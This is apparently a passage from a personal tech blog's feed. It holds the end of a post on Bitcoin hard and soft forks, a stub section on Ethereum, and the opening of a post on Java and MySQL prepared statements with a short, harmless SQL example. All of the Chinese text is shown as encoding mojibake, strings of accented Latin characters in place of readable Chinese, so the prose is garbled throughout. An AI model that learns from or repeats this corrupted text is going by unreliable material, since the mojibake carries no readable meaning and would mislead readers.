<p>è€Œæ­£æ˜¯è¿™ç§å·®å¼‚ï¼Œæˆ‘ä¹ŸèµåŒçŸ¥ä¹ä¸‹é¢çš„ä¸€ä¸ªè¯„è®ºï¼Œä¸å¦‚æŠŠè¿™ä¸¤è€…ç›´è¯‘ä¸ºï¼š<strong>Forward Compatibility</strong> å…¼å®¹æœªæ¥ï¼Œ<strong>Backward Compatibility</strong> å…¼å®¹è¿‡å»ã€‚</p>

<blockquote>
  <p>å…¼å®¹æœªæ¥ï¼ˆ<strong>Forward Compatibility</strong>ï¼‰ï¼šæŒ‡è€çš„è½¯ä»¶ / ç¡¬ä»¶ å…¼å®¹æ–°çš„è½¯ä»¶ / ç¡¬ä»¶ çš„æ•°æ®ï¼Œå¦‚æœåœ¨ç°å®ä¸­ä¼šå°‘ä¸€äº›ï¼Œå› ä¸ºå¼€å‘è€…éœ€è¦åœ¨è®¾è®¡ä¹‹åˆè€ƒè™‘å„ç§æƒ…å†µï¼Œæ¯”å¦‚ HTML é¡µé¢å°±æ˜¯å…¼å®¹æœªæ¥çš„ï¼Œæµè§ˆå™¨é‡åˆ°æ–°ç‰ˆæœ¬çš„ HTMLè¯­è¨€æ—¶ï¼Œå³ä½¿æœ‰ä¸€äº›æ ‡ç­¾æ— æ³•ä¸æ”¯æŒï¼Œä¹Ÿä¼šé€‰æ‹©å¿½è§†æ­£å¸¸ä½¿ç”¨ï¼Œè€Œæ¯”å¦‚ lambda è¡¨è¾¾å¼æ˜¯ java 8 æ‰€æ¨æ–°çš„ç‰¹æ€§ï¼Œå¦‚æœæ˜¯java 5çš„ç¼–è¯‘å™¨åˆ™ä¼šæŠ¥é”™ï¼Œè¿™å°±æ˜¯ä¸å…¼å®¹æœªæ¥çš„ä¾‹å­ã€‚</p>

  <p>å…¼å®¹è¿‡å»ï¼ˆ<strong>Backward Compatibility</strong> ï¼‰ï¼šæŒ‡æ–°çš„è½¯ä»¶ / ç¡¬ä»¶ å…¼å®¹è€çš„è½¯ä»¶ / ç¡¬ä»¶ çš„æ•°æ®ï¼Œè¿™ä¸ªåœ¨å¤§éƒ¨åˆ†çš„ç¼–ç¨‹è¯­è¨€ä¸­éƒ½æ»¡è¶³ï¼Œå³ä½¿æœ‰ä¸€äº›ç‰¹æ€§è¢«åˆ å»ï¼Œä¹Ÿåªæ˜¯ç»™å‡ºä¸€ä¸ª warningï¼Œå¹¶ä¸å½±å“æ­£å¸¸ç¼–è¯‘ä½¿ç”¨ã€‚ä½†å¾ˆå¤šè½¯ä»¶å°±ä¸è¿™æ ·ï¼Œå› ä¸ºè®¾è®¡ä¹‹åˆæ²¡æœ‰è€ƒè™‘åˆ°å¾ˆå¤šæƒ…å†µï¼Œå¯èƒ½å¿…é¡»è¦æŠ›å¼ƒè¿‡å»çš„ä¸€äº›ç‰¹æ€§ï¼Œåªèƒ½å¼ºè¡Œæ›´æ–°ä¸å…¼å®¹ã€‚</p>
</blockquote>

<p>å¥½äº†åˆšåˆšæˆ‘ä»¬èŠçš„éƒ½æ˜¯ç°å®ç”Ÿæ´»çš„ä¾‹å­ï¼Œé€šå¸¸ä¼šæœ‰ä¸€ä¸ªç®¡ç†æ–¹æˆ–è€…å¹³å°åˆ†å‘æ›´æ–°çš„æŠ¥å‘Šï¼Œè€Œåœ¨åŠ å¯†è´§å¸ä½“ç³»ä¸­ï¼Œå»ä¸­å¿ƒåŒ–çš„ç¯å¢ƒå¹¶æ²¡æœ‰ä¸¥æ ¼çš„å±‚æ¬¡ç»“æ„ï¼Œæ‰€è°“æ›´æ–°åªæ˜¯çŸ¿å·¥ä»¬å¹¿ä¹‰ä¸Šè¾¾åˆ°çš„æŸç§ <strong>å…±è¯†</strong> è€Œå·²ï¼Œæ¯”è¾ƒä¸å¯èƒ½ä¼šæœ‰äººé¡ºç€åœ°å€æ‘¸åˆ°çŸ¿å·¥å®¶é‡Œæ‹¿ç€æªé€¼ä»–è¿›è¡Œæ›´æ–°ã€‚</p>

<p>å…¶å®ä¸Šé¢çš„ä¸¤ç§å…¼å®¹æ¨¡å¼éƒ½æ˜¯æˆ‘å¦å¤–è¡¥å……çš„ï¼Œè‚–è‡»è€å¸ˆåœ¨è¯¾å ‚ä¸Šåªç”¨ä¸¤ä¸ªä¾‹å­æ¥æè¿°è½¯ç¡¬åˆ†å‰ï¼Œå¯èƒ½æˆ‘ç†è§£èƒ½åŠ›æ¯”è¾ƒå·®æ‰€ä»¥å¦å¤–è¡¥å……äº†ä¸€äº›çŸ¥è¯†è¿›è¡Œæ¦‚æ‹¬ï¼Œå¦‚æœæœ‰ä¸å¯¹çš„åœ°æ–¹è¿˜æœ›æ‰¹è¯„æŒ‡æ­£ã€‚</p>

<h3 id="ç¡¬åˆ†å‰">ç¡¬åˆ†å‰</h3>

<p>ç¡¬åˆ†å‰ç”¨ä¸€å¥è¯æ¦‚æ‹¬å°±æ˜¯ <strong>å…¼å®¹è¿‡å»ï¼Œä½†ä¸å…¼å®¹æœªæ¥</strong>ã€‚æ¯”ç‰¹å¸åè®®ä¿®æ”¹åï¼Œæœªå‡çº§çš„èŠ‚ç‚¹ä¸ä¼šè®¤å¯è¿™äº›ä¿®æ”¹ï¼Œä¼šè®¤ä¸ºè¿™äº›ç‰¹æ€§æ˜¯è¿æ³•çš„ï¼Œä»è€Œå¯¼è‡´åˆ†å‰ï¼Œæˆ‘ä»¬ä»¥ä¸€ä¸ªå…·ä½“çš„æƒ…å†µä¸ºä¾‹ï¼š</p>

<p>åœ¨BTCç³»ç»Ÿä¸­ï¼ŒåŒºå—å¤§å°æœ€å¤§ä¸º1MBï¼Œå¯ä»¥åŒ…å«çš„äº¤æ˜“æœ€å¤§æ•°é‡ä¸º4000ç¬”å·¦å³ã€‚è€Œä¸€ä¸ªåŒºå—äº§ç”Ÿå¤§æ¦‚éœ€è¦10minå·¦å³ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ•´ä¸ªæ¯”ç‰¹å¸ç³»ç»Ÿï¼Œå¹³å‡æ¯10åˆ†é’Ÿæœ€å¤šåªèƒ½å¤„ç†4000ç¬”äº¤æ˜“(å¹³å‡æ¯ç§’7ç¬”äº¤æ˜“)ï¼Œä¸¥é‡å½±å“äº†ååç‡å’Œäº¤æ˜“å¤„ç†ï¼Œæ‰€ä»¥æœ‰äººè®¤ä¸ºå¯ä»¥å¢å¤§åŒºå—å¤§å°ï¼Œä½¿å¾—ä¸€ä¸ªåŒºå—ä¸­åŒ…å«çš„äº¤æ˜“æ•°å˜å¤šï¼Œæˆ‘ä»¬å‡è®¾åŒºå—å¤§å°ä»1MBå¢å¤§åˆ°8MBã€‚</p>

<p>æˆ‘ä»¬å‡è®¾ç³»ç»Ÿä¸­å¤§å¤šæ•°èŠ‚ç‚¹éƒ½è¿›è¡Œäº†æ›´æ–°ï¼Œåªæœ‰å°‘éƒ¨åˆ† <strong>å®ˆæ—§æ´¾</strong> ä¸æ„¿æ„å¢å¤§ï¼ˆåŒºå—å¢å¤§ä¹Ÿä¼šå¯¼è‡´ç½‘ç»œä¼ è¾“å˜æ…¢ï¼‰ã€‚æˆ‘ä»¬è¿™é‡Œçš„<strong>å¤§å¤šæ•°</strong>å’Œ<strong>å°‘éƒ¨åˆ†</strong>å•çº¯æŒ‡çš„æ˜¯ç®—åŠ›ï¼Œè€Œä¸æ˜¯å…·ä½“çš„äººæ•°ã€‚</p>

<p><img src="../../assets/images/image-20220624005710693.png" alt="image-20220624005710693" /></p>

<p>å¦‚ä¸Šè‰å›¾æ‰€ç¤ºï¼Œå›¾ 1 ä¸ºå½“å‰åŒºå—é“¾ï¼Œæ­¤æ—¶åè®®æ›´æ–°ï¼Œç»¿è‰²çš„æ–°èŠ‚ç‚¹æŒ–åˆ°äº†åŒºå—ï¼Œå¦‚å›¾2ã€‚ä½†æ˜¯å¯¹äºæ—§èŠ‚ç‚¹æ¥è¯´å› ä¸ºä¸å‘æœªæ¥å…¼å®¹ï¼Œå®ƒè®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªéæ³•åŒºå—ï¼Œæ•…æ—§èŠ‚ç‚¹ä¾æ—§ç…§ç»¿è‰²åŒºå—å‰ä¸€ä¸ªåŒºå—æŒ–çŸ¿ï¼Œå¦‚å›¾ä¸‰ã€‚</p>

<p>ä½†æ˜¯å› ä¸ºæ–°èŠ‚ç‚¹çš„ç®—åŠ›å¼ºï¼Œå®ƒä¼šæ²¿ç€ä¸Šæ–¹çš„æœ€é•¿åˆæ³•é“¾è¿›è¡ŒæŒ–çŸ¿ï¼Œè€Œå¯¹äºæ—§èŠ‚ç‚¹æ¥è¯´ï¼Œä¸Šæ–¹é“¾ä¸Šå­˜åœ¨éæ³•åŒºå—ï¼Œä¸ä¼šè®¤å¯è¯¥é“¾ï¼Œä¹Ÿæ²¿ç€è‡ªå·±ä¸‹æ–¹çš„é“¾æŒ–çŸ¿ï¼Œå¯è§è¿™ç§åˆ†å‰æ˜¯æŒç»­æ€§çš„ï¼Œ<strong>åªè¦è¿™éƒ¨åˆ†æ—§èŠ‚ç‚¹ä¸æ›´æ–°ï¼Œä¸‹æ–¹çš„é“¾å°±æ°¸è¿œä¸ä¼šæ¶ˆå¤±</strong>ã€‚</p>

<p>å†å²ä¸ŠBTCçš„åˆ†å‰å¸BCHï¼ˆæ¯”ç‰¹å¸ç°é‡‘ï¼ŒåŒºå—å¤§å°ä¸ºï¼‰å°±æ˜¯è¿™æ ·ç¡¬åˆ†å‰è€Œæ¥ã€‚è€Œä»¥å¤ªåŠç½‘ç»œä¹ŸåŒæ ·å‘ç”Ÿè¿‡ç¡¬åˆ†å‰ï¼Œä¸è¿‡é‚£æ˜¯å› ä¸ºæ™ºèƒ½åˆçº¦ THE DAO  å­˜åœ¨<strong>é‡å…¥æ¼æ´</strong>ï¼Œè¢«é»‘å®¢æ”»å‡»åä¸å¾—ä¸ä»¥ç¡¬åˆ†å‰çš„æ–¹å¼å›æ»šäº¤æ˜“ï¼Œå…·ä½“å†…å®¹ä¼šåœ¨åç»­çš„ä»¥å¤ªåŠä¸­ä»‹ç»ã€‚</p>

<h3 id="è½¯åˆ†å‰">è½¯åˆ†å‰</h3>

<p>å…³äºè½¯åˆ†å‰çš„å®šä¹‰ï¼Œå…¶å®æˆ‘ä¸€ç›´æ²¡æœ‰æ‰¾åˆ°ä¸€ä¸ªæ¯”è¾ƒæ˜ç¡®çš„ç»“è®ºï¼Œåè€Œæ˜¯åœ¨ä¸åŒçš„èµ„æ–™ä¸Šæœ‰ä¸åŒçš„è§£é‡Šï¼šå¤§å¤šæ•°ç§‘æ™®æ–‡ç« æŠŠè½¯åˆ†å‰å½’ç»“äºåŒæ—¶ <strong>å…¼å®¹æœªæ¥å’Œå…¼å®¹è¿‡å»</strong>ï¼Œå³æ–°æ—§èŠ‚ç‚¹å¯ä»¥å®Œå…¨å…±å­˜åœ¨ä¸€æ¡æœ€é•¿é“¾ä¸Šï¼›è€Œè‚–è‡»è€å¸ˆçš„è®²ä¹‰ä¸Šä¸¾çš„ä¾‹å­æ˜¯<strong>å…¼å®¹æœªæ¥ï¼Œä½†ä¸å…¼å®¹è¿‡å»</strong>ã€‚æˆ‘æš‚ä¸”ç†è§£æ˜¯å¦å…¼å®¹è¿‡å»å–å†³äºå…·ä½“çš„åè®®å˜æ›´ï¼Œè¿™ä¹ˆçœ‹ç»´åŸºç™¾ç§‘ä¸Šå…³äºè½¯åˆ†å‰çš„æè¿°å¯èƒ½æ›´åŠ è§„èŒƒ<sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote" rel="footnote">2</a></sup>ï¼š</p>

<blockquote>
  <p>ä¸ç¡¬åˆ†å‰ç›¸æ¯”ï¼Œè½¯åˆ†å‰æ‰€äº§ç”Ÿä¹‹åŒºå—èƒ½å¤Ÿè¢«æ—§è½¯ä»¶è¯†åˆ«ä¸ºæœ‰æ•ˆåŒºå—ï¼Œå³åŒºå— <a href="https://zh.wikipedia.org/wiki/å‘ä¸‹å…¼å®¹">å‘ä¸‹å…¼å®¹</a>ã€‚ç„¶è€Œï¼Œæ—§è½¯ä»¶æ‰€äº§ç”Ÿä¹‹åŒºå—åˆ™<strong>æœªå¿…</strong>åœ¨æ–°è§„åˆ™ä¸‹æœ‰æ•ˆã€‚</p>
</blockquote>

<p>æˆ‘ä»¬åŒæ ·ä»¥åŒºå—å¤§å°ä¸ºä¾‹ï¼Œä¸è¿‡è¿™æ¬¡æ›´æ–°æ˜¯æŠŠåŒºå—å˜å°ï¼Œä»1MBå˜ä¸º0.5MBã€‚</p>

<blockquote>
  <p>æ³¨æ„è¿™é‡Œåªæ˜¯ç®€å•æ‰“äº†ä¸€ä¸ªæ¯”æ–¹ï¼Œå®é™…ä¸Šæ›´æ–°ä¸æ˜¯ç®€å•è°ƒæ•´ä¸€ä¸ªå‚æ•°é‚£ä¹ˆç®€å•ï¼Œå› ä¸ºæ˜¯å¦å…¼å®¹ä¸€å®šæ„ä¹‰ä¸Šå°±æ˜¯å–å†³äºä¿®æ”¹åè®®çš„éƒ¨åˆ†ã€‚</p>
</blockquote>

<p>æˆ‘ä»¬å‡è®¾å¤§å¤šæ•°èŠ‚ç‚¹è¿›è¡Œäº†æ›´æ–°ï¼ˆå³æ›´æ–°ä¹‹åçš„èŠ‚ç‚¹ç®—åŠ›è¶…è¿‡ 50%ï¼‰ï¼Œå¦‚æœè½¯åˆ†å‰æ»¡è¶³å…¼å®¹è¿‡å»ï¼Œé‚£ä¹ˆåº”è¯¥ä¼šå‡ºç°ä»¥ä¸‹è¿™ç§æƒ…å†µï¼š</p>

<p><img src="../../assets/images/image-20220624134618348.png" alt="image-20220624134618348" /></p>

<p>è™½ç„¶æ—§èŠ‚ç‚¹æ— æ³•è¯†åˆ«æ–°è§„åˆ™åˆ°çœŸå®å«ä¹‰ï¼Œä½†å› ä¸ºæ–°èŠ‚ç‚¹æ»¡è¶³åˆæ³•çš„è§„åˆ™ï¼Œæ‰€ä»¥æ–°æ—§èŠ‚ç‚¹åŒå¤„äºä¸€æ¡é“¾ä¸Šï¼Œå¯¹æ•´ä¸ªç³»ç»Ÿçš„å½±å“æ¯”è¾ƒå°ã€‚</p>

<p>ä½†ä¹Ÿæœ‰å¯èƒ½å‡ºç°è½¯åˆ†å‰ä¸å…¼å®¹è¿‡å»çš„æƒ…å†µï¼Œæ¯”å¦‚æ›´æ–°åçš„èŠ‚ç‚¹ï¼Œå¯ä»¥æ‹’ç»å¤§å°è¶…è¿‡0.5MBçš„åŒºå—ï¼š</p>

<p><img src="../../assets/images/image-20220624142213372.png" alt="image-20220624142213372" /></p>

<p>å¦‚æœæ–°èŠ‚ç‚¹ä¸è®¤å¯å¤§äº0.5MBçš„æ—§èŠ‚ç‚¹çš„è¯ï¼Œè®¤ä¸ºå…¶æ˜¯ä¸€ä¸ªéæ³•åŒºå—ï¼Œä¼šä»å…¶å‰ä¸€ä¸ªå°åŒºå—å¼€å§‹ï¼Œè€Œæ—§èŠ‚ç‚¹ä¸€ç›´è¢«æŠ›å¼ƒï¼Œä¸åœ¨æœ€é•¿åˆæ³•é“¾ä¸Šï¼Œå¯¼è‡´å¾—ä¸åˆ°å‡ºå—å¥–åŠ±ï¼Œæœ€åé€¼è¿«æ—§èŠ‚ç‚¹å‡çº§ï¼Œå®ç°åŒºå—é“¾ä¸Šçš„æ‰€æœ‰çŸ¿å·¥å…±åŒè®¤å¯æ–°åè®®ï¼Œå®ç°è½¯ä»¶åè®®çš„å‡çº§ã€‚</p>

<p>æ¯”ç‰¹å¸ä¸­çš„å¾ˆå¤šåŠŸèƒ½éƒ½æ˜¯åç»­é€šè¿‡è½¯åˆ†å‰åŠ å…¥å…¶ä¸­ï¼Œæ¯”å¦‚åœ¨æ¯”ç‰¹å¸ç³»ç»Ÿä¸­ç®€å•å¸¦è¿‡çš„ UTXOï¼Œå°±æ˜¯é€šè¿‡è½¯åˆ†å‰å†™å…¥åˆ°äº† CoinBaseåŸŸï¼Œæ—§èŠ‚ç‚¹è®¤å¯æ–°èŠ‚ç‚¹çš„åŒºå—ï¼Œä½†æ˜¯æ–°èŠ‚ç‚¹æ£€æŸ¥æ—§èŠ‚ç‚¹ CoinBaseåŸŸæ—¶å‘ç°å¹¶æ²¡æœ‰UTXOï¼Œåˆ™ä¸ä¼šè®¤å¯å…¶å‘å¸ƒçš„åŒºå—ã€‚ä¸è¿‡æ›´æ–°ä¹Ÿæ˜¯ä¸€ä¸ªæ…¢æ…¢è¿­ä»£çš„è¿‡ç¨‹ï¼Œæˆ‘ä»¬ä¸Šé¢æ‰€ä¸¾çš„ä¾‹å­ä¹Ÿæ˜¯ç«™åœ¨å·²ç»æœ‰ 50%çš„ç”¨æˆ·è¿›è¡Œæ›´æ–°çš„å‰æä¸‹ã€‚</p>

<p>æ€»ç»“ï¼š</p>

<p>ç¡¬åˆ†å‰ï¼šå¿…é¡»ç³»ç»Ÿä¸­æ‰€æœ‰èŠ‚ç‚¹æ›´æ–°è½¯ä»¶ï¼Œç³»ç»Ÿæ‰ä¸ä¼šäº§ç”Ÿæ°¸ä¹…æ€§åˆ†å‰ï¼Œå½“å‡ºç°æ›´æ–°æ—¶ï¼Œç¡¬åˆ†å‰å¯¼è‡´ç”¨æˆ·å¿…é¡»åšå‡ºé€‰æ‹©ï¼Œä¼šæŠŠç¤¾åŒºä¸€åˆ†ä¸ºäºŒã€‚</p>

<p>è½¯åˆ†å‰ï¼šæ¯”è¾ƒå¹³ç¨³ï¼Œæ–°çš„å‡çº§ä¸ä¼šé€ æˆæŸç§å†²çªï¼Œåªéœ€è¦å®æ–½æŸç§é™åˆ¶ï¼Œåªè¦ç³»ç»Ÿä¸­ä¸€åŠä»¥ä¸Šçš„ç®—åŠ›æ›´æ–°è½¯ä»¶ï¼Œç³»ç»Ÿå°±ä¸ä¼šäº§ç”Ÿæ°¸ä¹…æ€§åˆ†å‰ã€‚</p>

<h1 id="ä»¥å¤ªåŠ">ä»¥å¤ªåŠ</h1>

<h2 id="ä»¥å¤ªåŠæ¦‚è¿°">ä»¥å¤ªåŠæ¦‚è¿°</h2>

<p>BTCæˆä¸ºåŒºå—é“¾1.0ï¼Œä»¥å¤ªåŠæˆä¸ºåŒºå—é“¾2.0ã€‚ä»¥å¤ªåŠçš„å‡ºç°ï¼Œå¼¥è¡¥äº†ä¹‹å‰æˆ‘ä»¬æ‰€è¯´åŒºå—é“¾å­˜åœ¨çš„ä¸€äº›ä¸è¶³ï¼Œæ¯”å¦‚ï¼š</p>

<ol>
  <li>
    <p>æŒ–çŸ¿æ—¶é—´</p>

    <blockquote>
      <p>æ¯”ç‰¹å¸çš„å‡ºå—æ—¶é—´ä¸º10minï¼Œå¾ˆå¤šäººè§‰å¾—è¿™ä¸ªæ—¶é—´å¤ªé•¿äº†ï¼Œåœ¨ä»¥å¤ªåŠä¸­å¤§å¹…åº¦è§å‡å°ï¼Œæ”¹ä¸º10å¤šç§’ã€‚</p>
    </blockquote>
  </li>
  <li>
    <p>å…±è¯†æœºåˆ¶ä¸åŒ</p>

    <blockquote>
      <p>é’ˆå¯¹ä»¥å¤ªåŠçš„å‡ºå—æ—¶é—´ï¼Œä»¥å¤ªåŠç ”ç©¶å‡ºäº† ã€ åŸºäº Ghost åè®® ã€çš„å…±è¯†æœºåˆ¶ã€‚</p>
    </blockquote>
  </li>
  <li>
    <p>mining puzzle</p>

    <blockquote>
      <p>æ¯”ç‰¹å¸ä¸­çš„ mining puzzle æ˜¯çº¯æš´åŠ›è®¡ç®—å“ˆå¸Œï¼Œè¿™æ ·çš„ç»“æœæ˜¯æŒ–çŸ¿è®¾å¤‡ä¸“ä¸šåŒ–ã€‚ä½†è¿™ä¸€å®šæ„ä¹‰ä¸Šè¿èƒŒäº†å»ä¸­å¿ƒåŒ–åŸåˆ™ã€‚ä»¥å¤ªåŠçš„ mining puzzle å¯¹å†…å­˜æ˜¯æœ‰ä¸€å®šè¦æ±‚çš„ï¼Œè¿™ä¸€å®šæ„ä¹‰ä¸Šé™åˆ¶äº† ASIC èŠ¯ç‰‡çš„ä½¿ç”¨ã€‚</p>
    </blockquote>
  </li>
  <li>ä»¥å¤ªåŠç”¨æƒç›Šè¯æ˜(pos proof of stake)ä»£æ›¿äº† å·¥ä½œé‡è¯æ˜(pow)ã€‚</li>
  <li>ä»¥å¤ªåŠå¼•å…¥äº†å¯¹æ™ºèƒ½åˆçº¦(smart contract)çš„æ”¯æŒã€‚</li>
</ol>

<h2 id="ä»¥å¤ªåŠè´¦æˆ·">ä»¥å¤ªåŠè´¦æˆ·</h2>

<p>BTCç³»ç»Ÿæ˜¯åŸºäºäº¤æ˜“çš„è´¦æœ¬ï¼Œç³»ç»Ÿæ²¡æœ‰è®°å½•æ¯ä¸ªè´¦æˆ·æœ‰å¤šå°‘é’±ï¼Œåªèƒ½é€šè¿‡ UTXO è¿›è¡Œæ¨ç®—ã€‚</p>

<p>ä»¥å¤ªåŠç³»ç»Ÿé‡‡ç”¨äº†è´¦æˆ·çš„æ¨¡å¼ï¼Œå’Œç°å®ä¸­çš„é“¶è¡Œç±»ä¼¼ã€‚</p>

<p>ä»¥å¤ªåŠä¸­ï¼Œæœ‰ä¸¤ç±»è´¦æˆ·ï¼šå¤–éƒ¨è´¦æˆ·å’Œå†…éƒ¨è´¦æˆ·ã€‚</p>

<ul>
  <li>å¤–éƒ¨è´¦æˆ·ï¼ˆexternally owned accountï¼‰ï¼Œå­˜æœ‰ç±»ä¼¼BTCç³»ç»Ÿä¸­çš„å…¬ç§é’¥å¯¹ã€ä½™é¢å’Œè®¡æ•°å™¨ã€‚</li>
  <li>åˆçº¦è´¦æˆ·ï¼ˆsmart contract accountï¼‰ï¼šä¸èƒ½ä¸»åŠ¨å‘èµ·äº¤æ˜“ï¼Œåªèƒ½æ¥æ”¶åˆ°å¤–éƒ¨è´¦æˆ·è°ƒç”¨åæ‰èƒ½å‘èµ·äº¤æ˜“æˆ–è°ƒç”¨å…¶ä»–åˆçº¦è´¦æˆ·ï¼Œå…¶é™¤äº†balanceå’Œnonceä¹‹å¤–è¿˜æœ‰code(ä»£ç )ã€storage(ç›¸å…³çŠ¶æ€-å­˜å‚¨)ã€‚</li>
</ul>

<p>åˆ›å»ºåˆçº¦æ—¶ä¼šè¿”å›ä¸€ä¸ªåœ°å€ï¼Œé€šè¿‡åœ°å€å³å¯è°ƒç”¨ã€‚</p>

<h2 id="ä»¥å¤ªåŠä¸­çš„æ•°æ®ç»“æ„">ä»¥å¤ªåŠä¸­çš„æ•°æ®ç»“æ„</h2>

<h3 id="çŠ¶æ€æ ‘">çŠ¶æ€æ ‘</h3>

<h3 id="äº¤æ˜“æ ‘">äº¤æ˜“æ ‘</h3>

<h3 id="æ”¶æ®æ ‘">æ”¶æ®æ ‘</h3>

<p>2022 6.20</p>

<p>æœ€è¿‘å·¥ä½œæ¯”è¾ƒå¿™ï¼Œä»¥å¤ªåŠè¿™éƒ¨åˆ†å°±å…ˆä¸æ•´ç†äº†ã€‚</p>

<h2 id="å‚è€ƒ">å‚è€ƒ</h2>

<div class="footnotes" role="doc-endnotes">
  <ol>
    <li id="fn:1" role="doc-endnote">
      <p>çŸ¥ä¹ï¼š<a href="https://zhuanlan.zhihu.com/p/28195702">å‘å‰å…¼å®¹ä¸å‘åå…¼å®¹</a>Â <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:2" role="doc-endnote">
      <p>ç»´åŸºç™¾ç§‘ï¼š<a href="https://zh.wikipedia.org/wiki/%E5%88%86%E5%8F%89#%E8%BD%AF%E5%88%86%E5%8F%89">è½¯åˆ†å‰</a>Â <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
  </ol>
</div>]]></content><author><name>Theoyu</name></author><category term="cource" /><category term="cource" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">æµ…è°ˆJavaé¢„ç¼–è¯‘</title><link href="https://theoyu.top/2022/Java-Prepstatementared" rel="alternate" type="text/html" title="æµ…è°ˆJavaé¢„ç¼–è¯‘" /><published>2022-04-27T00:00:00+08:00</published><updated>2022-04-27T00:00:00+08:00</updated><id>https://theoyu.top/2022/Java-Prepstatementared</id><content type="html" xml:base="https://theoyu.top/2022/Java-Prepstatementared"><![CDATA[<p>ä¹‹å‰é¢è¯•é—®åˆ°äº†é¢„ç¼–è¯‘ç›¸å…³çš„é—®é¢˜ï¼Œæ„Ÿè§‰å›ç­”çš„ä¸æ˜¯å¾ˆå¥½ï¼Œé€šè¿‡å‡ ä¸ªä¾‹å­æ·±å…¥å­¦ä¹ ä¸€ä¸‹ã€‚</p>

<!--more-->

<p>Javaé¢„ç¼–è¯‘åˆ†æœåŠ¡ç«¯é¢„ç¼–è¯‘å’Œå®¢æˆ·ç«¯é¢„ç¼–è¯‘ä¸¤ç§ï¼Œå¯¹åº”çš„urlå‚æ•°ä¸º<code class="language-plaintext highlighter-rouge">useServerPrepStmts</code>ï¼Œå…¶ä¸ºtrueæ—¶æ˜¯åœ¨æ•°æ®åº“æœåŠ¡ç«¯é¢„ç¼–è¯‘ï¼Œå…¶ä¸ºfalseåˆ™æ˜¯åœ¨é©±åŠ¨åŒ…å†…è¿›è¡Œçš„å¤„ç†ã€‚</p>

<h2 id="æœåŠ¡ç«¯é¢„ç¼–è¯‘">æœåŠ¡ç«¯é¢„ç¼–è¯‘</h2>

<p>å…ˆç®€å•æ‘˜è¦ä¸€ä¸‹æ•°æ®åº“SQLè¯­å¥çš„ç¼–è¯‘ç‰¹æ€§ï¼š</p>

<blockquote>
  <p>æ•°æ®åº“æ¥å—åˆ°sqlè¯­å¥ä¹‹åï¼Œéœ€è¦æ£€æŸ¥ç¼“å­˜ã€è§„åˆ™éªŒè¯ï¼ˆ<strong>è¯æ³•å’Œè¯­ä¹‰è§£æ</strong>ï¼‰ã€è§£æå™¨è§£æä¸ºè¯­æ³•æ ‘ã€é¢„å¤„ç†å™¨è¿›ä¸€æ­¥éªŒè¯è¯­æ³•æ ‘ã€ä¼˜åŒ–SQLã€ç”Ÿæˆæ‰§è¡Œè®¡åˆ’ã€æ‰§è¡Œã€‚è¿™å‡ ä¸ªé˜¶æ®µå’Œæˆ‘ä»¬ä¸€äº›é«˜çº§è¯­è¨€çš„è§£é‡Šæ‰§è¡Œå·®ä¸å¤šæ˜¯ä¸€ä¸ªé“ç†ã€‚</p>

  <p>ä½†å¾ˆå¤šæ—¶å€™ï¼Œæˆ‘ä»¬ä¸€æ¡SQLè¯­å¥å¯èƒ½ä¼šæ‰§è¡Œå¤šæ¬¡ï¼Œæ¯æ¬¡æ‰§è¡Œå¯èƒ½åªæ˜¯ä¸ªåˆ«çš„å€¼ä¸ä¸€æ ·ï¼ˆæ¯”å¦‚queryçš„whereå­å¥ä¸ä¸€æ ·ï¼‰ï¼Œå¦‚æœæ¯æ¬¡éƒ½ç»è¿‡ä¸Šé¢é‡å¤çš„æ­¥éª¤ï¼Œæ•ˆç‡å°±ä¼šæ¯”è¾ƒä½äº†ï¼Œå› ä¸ºå¯¹å…¶ä¸­å¯¹è¯­æ³•çš„è§£æå’Œä¼˜åŒ–çš„è¿‡ç¨‹å…¶å®æ˜¯ä¸ä¼ å…¥çš„å­—æ®µå€¼æ— å…³</p>

  <p>æ‰€ä»¥é¢„ç¼–è¯‘ä½¿ç”¨å ä½ç¬¦?ä»£æ›¿å­—æ®µå€¼çš„éƒ¨åˆ†ï¼Œå°†SQLè¯­å¥å…ˆäº¤ç”±æ•°æ®åº“é¢„å¤„ç†ï¼Œæ„å»ºè¯­æ³•æ ‘ï¼Œå†ä¼ å…¥çœŸæ­£çš„å­—æ®µå€¼å¤šæ¬¡æ‰§è¡Œï¼Œçœå´äº†é‡å¤è§£æå’Œä¼˜åŒ–ç›¸åŒè¯­æ³•æ ‘çš„æ—¶é—´ï¼Œæå‡äº†SQLæ‰§è¡Œçš„æ•ˆç‡ã€‚</p>
</blockquote>

<p>æˆ‘ä»¬ä½¿ç”¨ä»¥ä¸‹ä¸‰æ¡è¯­å¥å°±å¯ä»¥ç®€å•åœ¨Mysqlä¸Šä½¿ç”¨é¢„ç¼–è¯‘ï¼š</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">prepare</span> <span class="n">stmt</span> <span class="k">from</span> <span class="s1">'select * from users where username = ?'</span><span class="p">;</span>
<span class="k">set</span> <span class="o">@</span><span class="n">username</span><span class="o">=</span><span class="nv">"admin"</span><span class="p">;</span>
<span class="k">execute</span> <span class="n">stmt</span> <span class="k">using</span> <span class="o">@</span><span class="n">username</span><span class="p">;</span>
</code></pre></div></div>

<p>å…¶å¯¹åº”çš„Javaä»£ç ä¸ºï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220428130250.png" alt="image-20220428005016462" /></p>

<p>æˆ‘ä»¬é€šè¿‡Wiresharkå¯ä»¥å‘ç°çš„ç¡®æ˜¯åœ¨æœåŠ¡ç«¯è¿›è¡Œäº†å¤„ç†ï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220428130252.png" alt="image-20220428005148389" /></p>

<p>é‚£å¦‚æœæˆ‘ä»¬ä¼ å…¥çš„usernameå¸¦ä¸€ä¸ªå•å¼•å·ï¼Œé¢„ç¼–è¯‘ä¼šæ€ä¹ˆå¤„ç†å‘¢ï¼Ÿ</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220428130253.png" alt="image-20220428005407244" /></p>

